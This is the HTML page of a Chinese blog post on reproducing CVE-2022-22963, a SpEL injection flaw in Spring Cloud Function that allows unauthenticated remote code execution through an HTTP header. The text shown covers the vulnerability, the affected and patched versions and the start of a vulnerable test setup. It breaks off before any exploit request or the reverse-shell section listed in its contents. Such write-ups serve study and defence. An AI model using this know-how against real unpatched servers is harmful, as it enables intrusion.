<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2022-22963漏洞复现 | Reus09&#39;s Blog</title>
<meta name="keywords" content="RCE, Spring漏洞">
<meta name="description" content="漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种">
<meta name="author" content="Reus09">
<link rel="canonical" href="/posts/tech/cve-2022-22963/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CVE-2022-22963漏洞复现" />
<meta property="og:description" content="漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/tech/cve-2022-22963/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-02T09:18:51+00:00" />
<meta property="article:modified_time" content="2022-09-11T16:04:43+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2022-22963漏洞复现"/>
<meta name="twitter:description" content="漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "📚文章",
      "item": "/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "👨🏻‍💻技术",
      "item": "/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "CVE-2022-22963漏洞复现",
      "item": "/posts/tech/cve-2022-22963/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2022-22963漏洞复现",
  "name": "CVE-2022-22963漏洞复现",
  "description": "漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种",
  "keywords": [
    "RCE", "Spring漏洞"
  ],
  "articleBody": "漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种平台上部署基于函数的软件。 由于Spring Cloud Function存在SpEL表达式注入漏洞。远程攻击者无需认证即可构造特定的数据包，并通过特定的 HTTP 请求头注入 SpEL 表达式。最终可导致远程执行任意代码，获取服务器权限。 风险等级：高风险 漏洞风险：攻击者利用该漏洞可导致远程执行任意代码，获取服务器权限 影响版本 Spring Cloud Function =\u003c 3.1.6 Spring Cloud Function =\u003c 3.2.2 安全版本 Spring Cloud Function \u003e= 3.1.7 Spring Cloud Function \u003e= 3.2.3 SpringCloud Function介绍 SpringCloud 是一套分布式系统的解决方案，常见的还有阿里巴巴的Dubbo，Fass（Function As A Service ）的底层实现就是函数式编程，在视频转码、音视频转换、数据仓库ETL等与状态相关度低的领域运用的比较多。开发者无需关注服务器环境运维等问题上，专注于自身业务逻辑实现即可。 SpringCloud Function 就是Spring提供的分布式函数式编程组件。 漏洞环境搭建 通过idea新建一个Spring项目，pom中引入spring-boot-starter-web、spring-cloud-function-web，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ",
  "wordCount" : "3083",
  "inLanguage": "en",
  "datePublished": "2022-07-02T09:18:51Z",
  "dateModified": "2022-09-11T16:04:43+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/tech/cve-2022-22963/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="">Home</a>&nbsp;»&nbsp;<a href="/posts/">📚文章</a>&nbsp;»&nbsp;<a href="/posts/tech/">👨🏻‍💻技术</a></div>
    <h1 class="post-title">
      CVE-2022-22963漏洞复现
    </h1>
    <div class="post-meta"><span title='2022-07-02 09:18:51 +0000 UTC'>2022-07-02</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e4%bb%8b%e7%bb%8d" aria-label="漏洞介绍">漏洞介绍</a></li>
                    <li>
                        <a href="#springcloud-function%e4%bb%8b%e7%bb%8d" aria-label="SpringCloud Function介绍"><code>SpringCloud Function</code>介绍</a></li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" aria-label="漏洞环境搭建">漏洞环境搭建</a></li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="漏洞复现">漏洞复现</a></li>
                    <li>
                        <a href="#%e5%8f%8d%e5%bc%b9shell" aria-label="反弹shell">反弹shell</a><ul>
                            
                    <li>
                        <a href="#%e6%9c%ac%e5%9c%b0%e5%ae%9e%e7%8e%b0" aria-label="本地实现">本地实现</a></li>
                    <li>
                        <a href="#%e4%b8%a4%e4%b8%aa%e8%99%9a%e6%8b%9f%e6%9c%ba%e5%ae%9e%e7%8e%b0" aria-label="两个虚拟机实现">两个虚拟机实现</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90" aria-label="原理分析">原理分析</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h2 id="漏洞介绍">漏洞介绍<a hidden class="anchor" aria-hidden="true" href="#漏洞介绍">#</a></h2>
<ul>
<li>Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种平台上部署基于函数的软件。</li>
<li>由于Spring Cloud Function存在SpEL表达式注入漏洞。远程攻击者无需认证即可构造特定的数据包，并通过特定的 HTTP 请求头注入 SpEL 表达式。最终可导致远程执行任意代码，获取服务器权限。
<ul>
<li>风险等级：高风险</li>
<li>漏洞风险：攻击者利用该漏洞可导致远程执行任意代码，获取服务器权限</li>
<li>影响版本
Spring Cloud Function =&lt; 3.1.6
Spring Cloud Function =&lt; 3.2.2</li>
<li>安全版本
Spring Cloud Function &gt;= 3.1.7
Spring Cloud Function &gt;= 3.2.3</li>
</ul>
</li>
</ul>
<h2 id="springcloud-function介绍"><code>SpringCloud Function</code>介绍<a hidden class="anchor" aria-hidden="true" href="#springcloud-function介绍">#</a></h2>
<ul>
<li><code>SpringCloud </code>是一套分布式系统的解决方案，常见的还有阿里巴巴的<code>Dubbo，Fass（Function As A Service ）</code>的底层实现就是函数式编程，在视频转码、音视频转换、数据仓库ETL等与状态相关度低的领域运用的比较多。开发者无需关注服务器环境运维等问题上，专注于自身业务逻辑实现即可。</li>
<li><code>SpringCloud Function</code> 就是<code>Spring</code>提供的分布式函数式编程组件。</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20220401101253.png" alt="image-20220401101253220"  />
</li>
</ul>
<h2 id="漏洞环境搭建">漏洞环境搭建<a hidden class="anchor" aria-hidden="true" href="#漏洞环境搭建">#</a></h2>
<ul>
<li>
<p>通过idea新建一个Spring项目，pom中引入<code>spring-boot-starter-web</code>、<code>spring-cloud-function-web</code>，如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
